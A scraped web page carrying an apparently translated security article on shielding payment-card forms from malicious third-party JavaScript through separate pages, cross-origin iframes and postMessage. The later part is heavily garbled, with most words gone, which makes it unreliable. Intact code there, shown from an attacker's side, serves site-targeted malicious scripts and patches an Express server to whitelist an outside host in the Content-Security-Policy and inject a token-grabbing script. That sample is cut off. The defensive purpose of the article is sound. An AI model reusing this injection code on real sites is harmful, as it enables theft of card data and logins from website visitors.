<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>The story of how not to let me steal credit card numbers and passwords from visitors to your sites</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="We recently published a translation of the programmer‚Äôs story, who invented a way to distribute malicious code that collects bank card data and passwo...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>The story of how not to let me steal credit card numbers and passwords from visitors to your sites</h1><div class="post__text post__text-html js-mediator-article">  We recently published a <a href="https://habrahabr.ru/company/ruvds/blog/346442/">translation</a> of the programmer‚Äôs story, who invented a way to distribute malicious code that collects bank card data and passwords from thousands of sites, while remaining unnoticed. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/4k/xv/io/4kxvio7tyoiwfj9poibufj6dtss.jpeg"></div><br>  That post provoked a lively and emotional response from the audience.  Someone said that everything was gone, and now he cannot sleep well, someone claimed that it certainly would not touch his projects, someone asked questions about how to protect against this ... To the problem , raised in the previous article, can be treated differently, but it is quite real, so today we are publishing a continuation of the story of who steals credit card numbers.  Today he will talk about how to protect web projects from potentially dangerous code. <br><a name="habracut"></a><br><h2>  <font color="#3AC1EF">In a nutshell, the most important thing</font> </h2><br>  Before we get into the details, in a nutshell, consider the main ideas that will be revealed here. <br><br>  So, to protect web projects you need to consider at least two things.  First, it is not necessary to avoid third-party code.  Secondly, special attention should be paid to the collection and processing of data that may be of interest to a potential attacker. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Namely, the collection of such data should be carried out by means of a dedicated web page, which should be displayed in a separate <code>iframe</code> .  It should be placed on a server for static web pages located on a domain other than the domain of the main site.  This is - if you want to work, say, with bank cards, independently.  Here you can go the other way, for example, if you doubt the effectiveness of the above protective measures, or simply do not want to complicate your project.  This way is that the processing of such data can be fully transferred to a specialized service. <br><br>  The recommendations given in this material are well suited only for sites that work with limited categories of valuable information that can be clearly separated from everything else and secured accordingly (for example, logins and passwords, as well as bank card data).  If you are developing something like a chat or database application, where absolutely everything may be of interest to an attacker, these recommendations will not help much here. <br><br><h2>  <font color="#3AC1EF">Hamster and Doberman</font> </h2><br>  A little fear is usually helpful.  It mobilizes and forces act.  I suggest you evaluate the feelings that you would have if you had to make a statement similar to the one that <a href="https://forums.oneplus.net/threads/jan-19-update-an-update-on-credit-card-security.752415/">OnePlus</a> recently had to make: <br><br><blockquote>  ... A malicious script was introduced into the code of the payment processing page. It was designed to steal credit card data during their entry ... This script worked intermittently, intercepting data and sending it to attackers directly from user browsers ... this incident can affect up to 40 thousand oneplus users. net. </blockquote><br>  Fear, of which we spoke above, has no concrete form.  In order to deal with it, let's turn to zoology, find its material embodiment in the animal world. <br><br>  I present the third-party code as a hefty full-grown Doberman.  He looks calm, even complacent.  But in his black, unblinking eyes, sparks of the unknown lurk.  Suffice it to say that I will not leave anything that is dear to me, wherever he can get. <br><br>  I imagine the confidential data of my users as a cute, defenseless hamster.  I see how he, with an innocent look, licks his front paws and washes his silly little face, as he carelessly frolics right in front of the dog's mouth. <br><br>  Now, if you have ever been on friendly terms with Doberman (which I highly recommend to you), you probably know that Dobermans are wonderful, kind creatures who definitely do not deserve the bad reputation that public opinion has given them.  However, despite this, you will not argue with the fact that you should not leave Doberman alone with a hamster, which is surprisingly similar to a chewing toy for dogs. <br><br>  I am sure that if you leave these two people in the same room when you leave the house, when you return, you will find the touching scene of general tranquility and you will see a hamster sleeping on the back of the Doberman.  Or, maybe (more likely), where your little pet used to be, there will be only a void, and the dog, with its head on one side, will ask how it is possible to look at the dessert menu. <br><br>  I believe that code taken from npm, GTM, DFP, or from anywhere else should not be considered undoubtedly dangerous.  But I want to suggest that if you cannot guarantee that this code will behave adequately, you would take into account that it is irresponsible to leave it alone with confidential user data. <br><br>  So, I advise you to stick to the following attitude: confidential data and third-party code cannot be kept together without supervision. <br><br><h2>  <font color="#3AC1EF">Example: Protecting a Vulnerable Site</font> </h2><br>  The site that we consider in this example has a form for entering credit card information that can be accessed by malicious code.  Such forms can be seen in several very large online stores that you probably thought were well protected. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/f13/bc1/a2a/f13bc1a2a91c6569bb24e319ea514c7a.png"></div><br>  <i><font color="#999999">Form for entering bank card data</font></i> <br><br>  This page is literally full of third-party code.  She uses React and was created using the Create React App, so even before she began serious work on her, she already had 886 dependencies. <br><br>  In addition, it has the Google Tag Manager (if someone does not know, GTM is a convenient mechanism that allows completely unknown people to inject JS code to your site, successfully bypassing the interference in the form of code analysis). <br><br>  And, for complete happiness, there is also a banner ad on this page (it did not appear on the screenshot).  This ad is one and a half megabyte of JS code scattered across 112 network requests.  All this takes 11 seconds of processor time to load a single animated gif representing a credit card jumping on a horse. <br><br>  (I‚Äôd like to note here that, in connection with all this, Google is disappointing. Its employees, who advocate the right approach to programming, spend a lot of time telling us how to make the web fast. They removed a few tens of kilobytes, then saved a few milliseconds ... Everything is fine, but at the same time they allow DFP's own ad network to send megabytes of data to users' devices, performing hundreds of network requests and taking seconds of processor time. Google, I know, is at your disposal  uu enough qualified specialists, mental potential which is enough to create a smarter and faster way to work with advertisements. Why is this still not been done?) <br><br>  So back to our topic.  Obviously, I need to pull out the users' secret data from the raking hands of third-party code.  I want the form in question to live on my own small island. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/df3/111/721/df3111721fe8ab44df90fb189847af9c.jpg"></div><br>  <i><font color="#999999">First you need to find a nice picture, and then come up with a metaphor that will connect this picture with the topic of the article.</font></i> <br><br>  Now that you have tuned in sufficiently for serious work, after reading some of my story today, I‚Äôm going to start describing practical approaches to protecting valuable data from third-party code.  Namely, here we consider three options for protection: <br><br><ul><li>  Option 1: moving the form for entering credit card data into its own document, which does not contain third-party code, and serving this document as a separate page. <br></li><li>  Option 2: in essence, the same as the first option, but the page for entering map data is placed in the <code>iframe</code> . <br></li><li>  Option 3: the same as the second option, but the parent page and the <code>iframe</code> exchange data using the <code>postMessage</code> mechanism. <br></li></ul><br><h3>  <font color="#3AC1EF">Option 1: a separate page for confidential data</font> </h3><br>  For security purposes, the easiest way is to create a new page for working with confidential data, which does not have JavaScript code at all.  When a user clicks on the ‚ÄúBuy‚Äù button, instead of showing him some pretty shape embedded in the page and styled according to its design, it is sent to something like this page: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/eb0/3e6/99e/eb03e699eecc7748932fa99f54d8b6d3.png"></div><br>  <i><font color="#999999">Dedicated page for working with bank card data</font></i> <br><br>  Unfortunately, since the header, footer and navigation bar of my site are components of React, I cannot use them on this page, created without the involvement of third-party code.  Therefore, its cap, a blue rectangle with the inscription, is a manually made copy of a full-featured cap.  A homemade hat, of course, does not have the same capabilities. <br><br>  When the user enters the data in the form, he clicks the Submit button and enters the next step of the purchase process.  This may require some changes in the server part of the site, which allow you to track the user's actions and the data that he sends to the system as he moves through the pages of the site. <br><br>  To ensure that the file with the form does not contain anything extra, I used the standard form validation mechanisms instead of what can be done in JavaScript.  As a result, the level of support for such a page <a href="https://caniuse.com/">exceeds 97%</a> , and working with the <code>required</code> and <code>pattern</code> attributes allows you to assess how far the implementation of input data validation using JavaScript has advanced. <br><br>  <a href="https://codepen.io/davidgilbertson/pen/OzdEbL">Here is</a> an example of such a page on CodePen.  Here we use the validation of the entered data using regular expressions without using JS and conditional styling. <br><br>  If you are going to use this approach in practice, I recommend keeping the code related to the form in one file.  Complexity is the enemy of such an approach (in our situation, this attitude to complexity is especially true).  The HTML file of the above example, along with the embedded CSS in the <code>&lt;style&gt;</code> , takes about 100 lines of code.  Since it is very small and no additional network requests are needed to display this file, it is almost impossible to change it imperceptibly. <br><br>  Unfortunately, this approach requires copying CSS styles.  I thought about it a lot and considered different approaches.  All of them require more code than the amount of copied CSS, duplication of which can be prevented with their help. <br><br>  So, although the idea of ‚Äã‚Äã‚ÄúDon't Repeat Yourself‚Äù is an excellent reference point, it should not be viewed as an absolute rule that must be fulfilled at all costs.  In some rare cases, like the one we are considering here, copying the code is the lesser of two evils. <br><br>  The most useful rules are those that are known for when they can be broken. <br>  (In the new year I'm trying to communicate smart things, without saying anything to the point). <br><br><h3>  <font color="#3AC1EF">Option 2: an independent page in the iframe</font> </h3><br>  The first option turned out to be quite working, but this is a step back from the point of view of designing user interfaces and UX.  In addition, the stage when you take money from someone is not the case when it is worthwhile to load a person with unnecessary movements through the pages. <br><br>  The second option improves the situation due to the fact that the page with the form is placed in the <code>iframe</code> . <br><br>  Here you might try to do something like this: <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/credit-card-form.html"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">title</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"credit card form"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"460"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"400"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">frameBorder</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">scrolling</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag"> /&gt;</span></span></code> </pre> <br>  Do not do this. <br><br>  In this example, the parent page and the contents of the <code>iframe</code> are free to see each other and interact with each other.  It will be the same as if you leave the Doberman in one room, the hamster in the other, and between these two rooms there will be an unlocked door, which the Doberman, when hungry, can easily open. <br><br>  It would be nice to put an <code>iframe</code> in the sandbox.  And (as I just learned), this has nothing to do with the <code>iframe</code> <code>sandbox</code> attribute, as it aims to protect the parent page from the <code>iframe</code> .  Our task is to protect the <code>iframe</code> from the parent page. <br><br>  In browsers there is a built-in mechanism that allows you to distrust the code that comes from a source other than where the base page comes from.  This is called the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">same-origin policy</a> ‚Äî a security policy that restricts the interaction of code obtained from different sources.  Thanks to this mechanism, in order to prevent the base page from interacting with the <code>iframe</code> , it is enough to load the page into the <code>iframe</code> from another domain: <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://different.domain.com/credit-card-form.html"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">title</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"credit card form"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"460"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"400"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">frameBorder</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">scrolling</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag"> /&gt;</span></span></code> </pre> <br>  With this approach, if you go back to our example from the world of pets, the hamster will thank you so much for locking the door securely. <br><br>  If you are concerned about the availability of <code>iframe</code> content for people with disabilities, I can say that, firstly, I am proud of you, and secondly, you can no longer worry about it.  This is what <a href="https://webaim.org/techniques/frames/">WebAIM</a> reports about this: ‚ÄúThe embedded <a href="https://webaim.org/techniques/frames/">iframes</a> have no known accessibility issues.  The content of the embedded iframe is read from the position of its inclusion in the page (based on the order of the tags in the markup) as if it were the contents of the parent page. " <br><br>  Now let's think about what will happen when the form is filled.  The user clicks on the submit button of this form located in the <code>iframe</code> , but we need it to affect the parent page.  However, the content of the page and the <code>iframe</code> different sources, which leads to the question of whether the implementation of the above scheme is possible. <br><br>  Fortunately, this is possible, and the <code>target</code> form attribute is intended for this: <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/pay-for-the-thing"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_top"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- form fields --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  So, the user can enter confidential data in a form that perfectly matches the main page.  Then, when the form is submitted, the parent page is redirected. <br><br>  The second option for protecting valuable data that we are considering is a huge step forward in terms of security, namely, on the base page, full of external dependencies, there is no longer a form available to the code of these dependencies. <br><br>  However, the ideal solution to our problem should not require page redirection.  This leads us to the third option. <br><br><h3>  <font color="#3AC1EF">Option 3: data exchange between the parent page and the iframe</font> </h3><br>  On my experimental site, I would like to store the bank card data in the application state, along with information about the product being purchased, and after collecting all the necessary information, transmit it using one AJAX request. <br><br>  This is incredibly simple.  To send data from the form to the parent page, I will use the <code>postMessage</code> mechanism. <br><br>  So, here is the page located in the <code>iframe</code> : <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"form"</span></span></span><span class="hljs-tag">&gt;</span></span>     <span class="hljs-comment"><span class="hljs-comment">&lt;!-- form stuff in here --&gt;</span></span>   <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">   </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> form = </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.getElementById(</span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'form'</span></span></span><span class="javascript">);   form.addEventListener(</span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'submit'</span></span></span><span class="javascript">, </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function">(</span></span><span class="hljs-params"><span class="javascript"><span class="hljs-function"><span class="hljs-params">e</span></span></span></span><span class="javascript"><span class="hljs-function">) </span></span></span><span class="javascript">{     e.preventDefault();     </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> payload = {       </span><span class="hljs-attr"><span class="javascript"><span class="hljs-attr">type</span></span></span><span class="javascript">: </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'bananas'</span></span></span><span class="javascript">,       </span><span class="hljs-attr"><span class="javascript"><span class="hljs-attr">formData</span></span></span><span class="javascript">: {         </span><span class="hljs-attr"><span class="javascript"><span class="hljs-attr">a</span></span></span><span class="javascript">: form.ccname.value,         </span><span class="hljs-attr"><span class="javascript"><span class="hljs-attr">b</span></span></span><span class="javascript">: form.cardnumber.value,         </span><span class="hljs-attr"><span class="javascript"><span class="hljs-attr">c</span></span></span><span class="javascript">: form.cvc.value,         </span><span class="hljs-attr"><span class="javascript"><span class="hljs-attr">d</span></span></span><span class="javascript">: form[</span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'cc-exp'</span></span></span><span class="javascript">].value,       },     };     </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.parent.postMessage(payload, </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'https://mysite.com'</span></span></span><span class="javascript">);   }); </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  Notice the <code>var</code> .  Now, on the parent page (or, more precisely, in the React component, which is responsible for the <code>iframe</code> ), I just wait for messages from the <code>iframe</code> and update the state accordingly: <br><br><pre> <code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">CreditCardFormWrapper</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">PureComponent</span></span></span><span class="hljs-class"> </span></span>{ componentDidMount() {   window.addEventListener(<span class="hljs-symbol"><span class="hljs-symbol">'messag</span></span>e', ({ data }) =&gt; {     <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (data.<span class="hljs-keyword"><span class="hljs-keyword">type</span></span> === <span class="hljs-symbol"><span class="hljs-symbol">'banana</span></span>s') {       <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.setState(data.formData);     }   }); } render() {   <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (     &lt;iframe       src=<span class="hljs-string"><span class="hljs-string">"https://secure.mysite.com/credit-card-form.html"</span></span>       title=<span class="hljs-string"><span class="hljs-string">"credit card form"</span></span>       height=<span class="hljs-string"><span class="hljs-string">"460"</span></span>       width=<span class="hljs-string"><span class="hljs-string">"400"</span></span>       frameBorder=<span class="hljs-string"><span class="hljs-string">"0"</span></span>       scrolling=<span class="hljs-string"><span class="hljs-string">"no"</span></span>     /&gt;   ); } }</code> </pre> <br>  This example is based on React, but the same idea can be implemented by other means. <br>  If this approach seems to be insecure, you can instead send data from the form of the parent entity using the <code>onchange</code> event, separately for each field. <br><br>  While I am doing all this, nothing prevents the parent page from checking the entered data and sending a form to the form that everything has been entered correctly.  This allows me to reuse the input validation code that is somewhere else in my project. <br><br>  Here I wanted to make an addition based on <a href="https://medium.com/%40jimmybyrum/any-reason-not-to-do-form-validation-within-the-iframe-either-with-some-very-trustworthy-js-or-a1e7695f82b1">two</a> <a href="https://medium.com/%40jeremenichelli/first-thanks-for-writing-about-this-great-real-case-examples-and-advices-david-b19b19ca9a66">valuable</a> comments, in which I was told that the <code>iframe</code> could send data without redirecting the parent page, and then send the parent page a message about the success or failure of the operation using <code>postMessage</code> .  With this approach, no confidential data is transmitted to the parent page at all. <br><br>  That's all!  Valuable user data is safely entered into a form placed in an <code>iframe</code> and loaded there from a source different from the source of the base page.  This data is hidden from the parent page, but at the same time it can be part of the application state, which means that the user will be just as comfortable with the site as without using the <code>iframe</code> . <br><br>  Here you might think that sending credit card information to the parent page negates all our efforts to protect this data.  Will this data be available to malicious code located on the base page? <br><br>  The answer to this question consists of two parts, and I apologize in advance, but I can not think of a simple way to explain it. <br><br>  The reason why I consider the level of risk characteristic of the proposed approach acceptable is easiest to understand if you look at the situation through the eyes of a hacker.  Imagine that you are faced with the task of creating malicious code that can work on any website, searching for valuable information and sending it to any server.  Each time this code sends something, it risks being detected.  Therefore, it is in your interest to send to the server only those data in whose value you are confident. <br><br>  If I had to write such code, I would not indiscriminately listen to the <code>message</code> event and send to the server what I managed to extract from them.  I do not need it, since there are thousands of sites that use sensitive forms for entering payment data, and the fields of these forms are neatly signed. <br><br>  The second part of the answer is that the malicious code that bothers you is not something universal.  This code may well know exactly which messages it needs to intercept, which means it will be able to steal valuable data transmitted in these messages.  Protection against malicious code that is written specifically for your site is a topic that deserves a separate section. <br><br><h2>  <font color="#3AC1EF">Universal malicious code, and code designed for a specific site</font> </h2><br>  So far I have been talking about attacks using universal malicious code.    ,   ,      .    ,   ,        -. <br><br>  ,    ,   ,  ,       -.    ,     ,     . <br><br>       ,    ,  ,   .      . ,        <code>iframe</code> ,       <code>iframe</code>      .        -, ,    50%   ,       ,      .   ‚Äî  . <br><br>     , ,         . <br><br>     <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">  </a> .  .           (,  npm-),   ¬´¬ª   ,    ,           ,  .        : <br><br><pre> <code class="hljs pgsql">app.<span class="hljs-keyword"><span class="hljs-keyword">get</span></span>(<span class="hljs-string"><span class="hljs-string">'/analytics.js'</span></span>, (req, res) =&gt; { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (req.<span class="hljs-keyword"><span class="hljs-keyword">get</span></span>(<span class="hljs-string"><span class="hljs-string">'host'</span></span>).includes(<span class="hljs-string"><span class="hljs-string">'acme-sneakers.com'</span></span>)) {   res.sendFile(<span class="hljs-type"><span class="hljs-type">path</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">join</span></span>(__dirname, <span class="hljs-string"><span class="hljs-string">'../malicious-code/targeted/acme-sneakers.js'</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (req.<span class="hljs-keyword"><span class="hljs-keyword">get</span></span>(<span class="hljs-string"><span class="hljs-string">'host'</span></span>).includes(<span class="hljs-string"><span class="hljs-string">'corporate-bank.com'</span></span>)) {   res.sendFile(<span class="hljs-type"><span class="hljs-type">path</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">join</span></span>(__dirname, <span class="hljs-string"><span class="hljs-string">'../malicious-code/targeted/corporate-bank.js'</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (req.<span class="hljs-keyword"><span class="hljs-keyword">get</span></span>(<span class="hljs-string"><span class="hljs-string">'host'</span></span>).includes(<span class="hljs-string"><span class="hljs-string">'government-secrets.com'</span></span>)) {   res.sendFile(<span class="hljs-type"><span class="hljs-type">path</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">join</span></span>(__dirname, <span class="hljs-string"><span class="hljs-string">'../malicious-code/targeted/government-secrets.js'</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (req.<span class="hljs-keyword"><span class="hljs-keyword">get</span></span>(<span class="hljs-string"><span class="hljs-string">'host'</span></span>).includes(<span class="hljs-string"><span class="hljs-string">'that-chat-app.com'</span></span>)) {   res.sendFile(<span class="hljs-type"><span class="hljs-type">path</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">join</span></span>(__dirname, <span class="hljs-string"><span class="hljs-string">'../malicious-code/targeted/that-chat-app.js'</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> {   res.sendFile(<span class="hljs-type"><span class="hljs-type">path</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">join</span></span>(__dirname, <span class="hljs-string"><span class="hljs-string">'../malicious-code/generic.js'</span></span>)); } });</code> </pre> <br>     ,    , ,   .  ‚Äî      .      . <br><br>  -,     ,   <code>postMessage</code>      <code>iframe</code>       .         ,  ,     ,  ,      ,    . <br><br>     ,             .                      Google, Facebook  Twitter. ,      .       ,      ,             ,   ,      . <br><br><h2> <font color="#3AC1EF">   -</font> </h2><br> ,  ,      ,      .      ‚Ä¶  ,      ,     -. ,          . <br><br><h3> <font color="#3AC1EF">‚ñç</font> </h3><br> ,     HTML-,      .          .      - ,      . <br><br> ,      Node.js. ,          ‚Ä¶ <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/266/8c9/567/2668c956789582e963674ec8cf94a681.png"></div><br> <i><font color="#999999">,    . 204 ?</font></i> <br><br> , 204  ‚Äî  ,       ,  ,   ,     ,    ,   ? <br><br>    ,   ,   npm-,    ,   ,    ,   ,  ,     . <br><br> ,  ‚Äî  ,        <code>this</code>  <code>call</code> ,            ,          ,   CSP. <br><br><pre> <code class="hljs pgsql">const fs = require(<span class="hljs-string"><span class="hljs-string">'fs'</span></span>); const express = require(<span class="hljs-string"><span class="hljs-string">'express'</span></span>); let indexHtml; const originalResponseSendFile = express.response.sendFile; express.response.sendFile = <span class="hljs-keyword"><span class="hljs-keyword">function</span></span>(<span class="hljs-type"><span class="hljs-type">path</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">options</span></span>, callback) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-type"><span class="hljs-type">path</span></span>.endsWith(<span class="hljs-string"><span class="hljs-string">'index.html'</span></span>)) {   //          let csp = express.response.<span class="hljs-keyword"><span class="hljs-keyword">get</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">call</span></span>(this, <span class="hljs-string"><span class="hljs-string">'Content-Security-Policy'</span></span>) || <span class="hljs-string"><span class="hljs-string">''</span></span>;   csp = csp.replace(<span class="hljs-string"><span class="hljs-string">'connect-src '</span></span>, <span class="hljs-string"><span class="hljs-string">'connect-src https://adxs-network-live.com '</span></span>);   express.response.<span class="hljs-keyword"><span class="hljs-keyword">set</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">call</span></span>(this, <span class="hljs-string"><span class="hljs-string">'Content-Security-Policy'</span></span>, csp);   //      <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!indexHtml) {     indexHtml = fs.readFileSync(<span class="hljs-type"><span class="hljs-type">path</span></span>, <span class="hljs-string"><span class="hljs-string">'utf8'</span></span>);     const script = `       &lt;script&gt;         var googleAuthToken = document.createElement(<span 